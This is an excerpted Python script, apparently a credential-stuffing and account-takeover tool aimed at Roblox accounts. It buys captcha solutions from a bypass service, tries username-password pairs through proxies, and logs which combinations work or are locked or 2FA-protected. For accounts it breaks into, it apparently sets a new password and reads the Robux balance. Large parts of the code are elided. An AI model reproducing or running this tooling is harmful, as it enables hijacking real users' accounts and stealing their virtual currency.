...
CAPBYPASS_KEY = config["capbypass_key"]
WEBHOOK_ENABLED = config["log_to_webhook"]
WEBHOOK_URL = config["webhook_url"]

baseURL = "https://capbypass.com/"
...
def GetTaskID(blob, publickey, proxy):
 data = {
 ...
 req = requests.post(f"{baseURL}/api/createTask", json=data, timeout=120)
 print(req.json())
...
def GetToken(TaskID):
    data = {"clientKey": CAPBYPASS_KEY, "taskId": TaskID}
    start = time.time()
    while True:
        req = requests.post(f"{baseURL}/api/getTaskResult", json=data, timeout=200)
        response_data = req.json()
        if "solution" in response_data:
            end = time.time()
            elapsed = end - start
            print(f"took {str(elapsed)} to solve captcha, remaining balance is: {get_balance()}")
            return response_data["solution"]
        elif response_data["status"] == "FAILED":
            end = time.time()
            elapsed = end - start
            print(f"took {str(elapsed)} for captcha to fail")
            break
            return None

def get_balance():
    balance_response = requests.post(f"{baseURL}/api/getBalance", json={"clientKey": CAPBYPASS_KEY}, headers={'Content-Type': 'application/json'})
    if balance_response.status_code == 200:
        balance_data = balance_response.json()
        return balance_data['credits']
    else:
            ...
            try:
                ...
                if 'twoStepVerificationData' in req.text:
                    ...
                    with self.lock:
                        ...
                        print_thread_safe(Output('ERROR').log("2FA for account", username + " - " + password))
                ...
                if "Incorrect username or password" in req.text:
                    ...
                    print_thread_safe(Output('ERROR').log("Incorrect password for account:", username + " - " + password))
                ...
                reqToSolve = GetTaskID(blob, "476068BF-9607-4799-B53D-966BE98E2B81", proxy)    

                reqToSolveJson = GetToken(reqToSolve)

                token = reqToSolveJson

                if token == None:

                    raise ValueError("Failed to solve captcha.")

                print_thread_safe(Output("SUCCESS").log("Captcha solved!"))
                ...
                if 'Account has been locked' in req.text:
                    ...
                    print_thread_safe(Output('ERROR').log("Security notification for Account:", username + " - " + password))
                ...
                if req.status_code == 200:
                    ...
                    try:
                        ...
                        newPass = '.gg/pger~'.join(random.choice(string.ascii_letters) for _ in range(random.randint(10, 18)))
                            ...
                            try:
                                ...
                                with self.lock:
                                    ...
                                    try:
                                        ...
                                        robux = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers, proxies={"http": f"{proxy}", "https": f"{proxy}"}).json()["RobuxBalance"]
